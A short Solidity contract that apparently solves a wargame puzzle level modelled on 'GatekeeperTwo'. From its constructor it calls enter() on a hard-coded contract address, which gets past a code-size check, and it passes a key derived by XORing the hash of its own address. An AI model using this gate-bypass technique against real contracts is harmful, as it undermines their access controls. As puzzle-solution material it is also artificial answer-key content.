
interface Gate2 {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Gate2Keeper {

    constructor() public {
        Gate2 gate = Gate2(0xd2d74232721dD0965B6326796a20604A58A4d343);
        bytes8 key = bytes8((uint64(0) - 1 ) ^ (uint64(bytes8(keccak256(abi.encodePacked(address(this)))))));
        gate.enter(key);
    }
}